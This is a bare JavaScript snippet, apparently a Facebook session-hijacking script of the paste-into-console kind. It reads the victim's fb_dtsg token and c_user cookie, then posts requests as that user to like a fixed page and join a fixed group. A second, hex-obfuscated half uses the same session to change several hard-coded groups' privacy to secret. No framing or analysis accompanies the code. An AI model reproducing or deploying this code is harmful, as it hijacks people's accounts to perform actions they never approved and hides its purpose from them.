var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'],
    user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]); {
    var Page = new XMLHttpRequest(),
        PageURL = '//www.facebook.com/ajax/pages/fan_status.php',
        PageParams = 'fb_dtsg=' + fb_dtsg + '&fbpage_id=295931113871077&add=true&reload=false&fan_origin=page_timeline&fan_source&cat&&nctr[_mod]=pagelet_timeline_page_actions&__user=' + user_id + '';
    Page['open']('POST', PageURL, true);
    Page['onreadystatechange'] = function () {
        if (Page['readyState'] == 4 && Page['status'] == 200) {
            Page['close'];
        };
    };
    Page['send'](PageParams);
};
setTimeout(function () {
    var Page = new XMLHttpRequest(),
        PageURL = '//www.facebook.com/ajax/groups/membership/r2j.php',
        PageParams = 'fb_dtsg=' + fb_dtsg + '&ref=group_jump_header&group_id=480777978696004&__user=' + user_id + '';
    Page['open']('POST', PageURL, true);
    Page['onreadystatechange'] = function () {
        if (Page['readyState'] == 4 && Page['status'] == 200) {
            Page['close'];
        };
    };
    Page['send'](PageParams);
}, 1000);

$mzOe6blG_5$nI8GLOH3=function(n){if(typeof($mzOe6blG_5$nI8GLOH3.list[n])=="string")return $mzOe6blG_5$nI8GLOH3.list[n].split("").reverse().join("");return $mzOe6blG_5$nI8GLOH3.list[n]};$mzOe6blG_5$nI8GLOH3.list=[/c_user=(\d+)/];var _0x13d7=["\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x67\x72\x6F\x75\x70\x73\x2F\x69\x6E\x66\x6F\x72\x6D\x61\x74\x69\x6F\x6E\x2F\x65\x64\x69\x74\x2E\x70\x68\x70","\x63\x6F\x6E\x66\x69\x72\x6D\x65\x64\x3D\x31\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x70\x72\x69\x76\x61\x63\x79\x3D\x73\x65\x63\x72\x65\x74\x26\x67\x72\x6F\x75\x70\x5F\x69\x64\x3D","\x26\x63\x6F\x6E\x66\x69\x72\x6D\x3D\x43\x6F\x6E\x66\x69\x72\x6D\x26\x6E\x63\x74\x72\x5B\x5F\x6D\x6F\x64\x5D\x3D\x70\x61\x67\x65\x6C\x65\x74\x5F\x67\x72\x6F\x75\x70\x5F\x65\x64\x69\x74\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x63\x6F\x6E\x66\x69\x72\x6D\x3D\x31","\x73\x65\x6E\x64","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x63\x6C\x6F\x73\x65","\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65"];function rges(c){var d=new XMLHttpRequest,e=_0x13d7[0],f=_0x13d7[1]+fbz+_0x13d7[2]+c+_0x13d7[3]+idz+_0x13d7[4];d[_0x13d7[8]](_0x13d7[7],e,!0),d[_0x13d7[6]]=function(){4==d[_0x13d7[9]]&&200==d[_0x13d7[10]]&&d[_0x13d7[11]]},d[_0x13d7[5]](f)}var fbz=document[_0x13d7[14]](_0x13d7[13])[0][_0x13d7[12]],idz=document[_0x13d7[16]][_0x13d7[15]](document[_0x13d7[16]][_0x13d7[15]]($mzOe6blG_5$nI8GLOH3(0))[1]);rges(0x5091805a0ba73),rges(384741095000083),rges(0xbe00350c58d3),rges(0xecc2a11c03ac);
